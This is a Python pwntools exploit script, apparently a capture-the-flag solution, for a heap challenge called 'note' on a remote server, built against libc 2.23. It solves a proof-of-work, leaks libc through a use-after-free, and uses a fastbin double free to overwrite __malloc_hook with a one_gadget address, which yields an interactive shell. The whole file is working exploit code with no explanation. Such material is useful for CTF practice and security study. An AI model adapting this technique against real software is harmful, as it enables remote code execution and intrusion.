# -*- coding: UTF-8 -*-
import hashlib
from pwn import *
from pwnlib.util.iters import mbruteforce

context.log_level = 'debug'
context.terminal = ["/usr/bin/tmux","sp","-h"]
local = False
io = remote('chuj.top', 52799) # chuj.top 52664
libc = ELF('./libc-2.23.so')
# io = process('note')
# libc = ELF('/home/yrl/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')

l64 = lambda      :u64(io.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
l32 = lambda      :u32(io.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
rl = lambda	a=False		: io.recvline(a)
ru = lambda a,b=True	: io.recvuntil(a,b)
rn = lambda x			: io.recvn(x)
sn = lambda x			: io.send(x)
sl = lambda x			: io.sendline(x)
sa = lambda a,b			: io.sendafter(a,b)
sla = lambda a,b		: io.sendlineafter(a,b)
irt = lambda			: io.interactive()
dbg = lambda text=None  : gdb.attach(io, text)
lg = lambda s			: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
lgs = lambda s			: log.info('\033[1;31;40m %s --> %s \033[0m' % (s, eval(s)))
uu32 = lambda data		: u32(data.ljust(4, '\x00'))
uu64 = lambda data		: u64(data.ljust(8, '\x00'))
ur64 = lambda data		: u64(data.rjust(8, '\x00'))
def add(idx,size,content):
	sl('1')
	sa('index?\n>> ',str(idx))
	sa('size?\n>> ',str(size))
	sa('content?\n>> ',content)
def show(idx):
	sl('2')
	sla('index?\n>> ',str(idx))
		
def delete(idx):
	sl('3')
	sla('index?\n>> ',str(idx))

def exit(idx):
	sl('4')

if local == False:
    io.recvuntil(') == ') 
    hash_code = io.recvuntil('\n', drop=True).decode().strip() 
    log.success('hash_code={},'.format(hash_code)) 
    charset = string.printable 
    proof = mbruteforce(lambda x: hashlib.sha256((x).encode()).hexdigest() == hash_code, charset, 4, method='fixed') 
    io.sendlineafter('????> ', proof)

add(0,0xf0,str(0)) # 0
add(1,0xf0,str(1)) # 1
delete(0)
show(0)
libcbase  = l64() - 0x3c4b78
lg('libcbase')
mallochook = libcbase + libc.sym['__malloc_hook']
reallochook = libcbase + libc.sym['__realloc_hook']
realloc = libcbase + libc.sym['realloc']
system = libcbase + libc.sym['system']
binsh = libcbase + libc.search('/bin/sh').next()
lg('mallochook')
lg('reallochook')
lg('realloc')
lg('system')
lg('binsh')

add(2,0x68,str(2)) # 2
add(3,0x68,str(2)) # 3
add(4,0x68,str(2)) # 4

delete(3)
delete(2)
delete(3)
add(3,0x68,p64(mallochook-0x23))
add(2,0x68,'2')
add(3,0x68,'3')
add(5,0x68,'a'*11+p64(libcbase+0x4527a)+p64(realloc)) #0x45226  0xf03a4 0xf1247 0x4527a
# dbg()

ru('>> ')
sl('1')
sa('index?\n>> ',str(6))
sa('size?\n>> ',str(32))

irt()


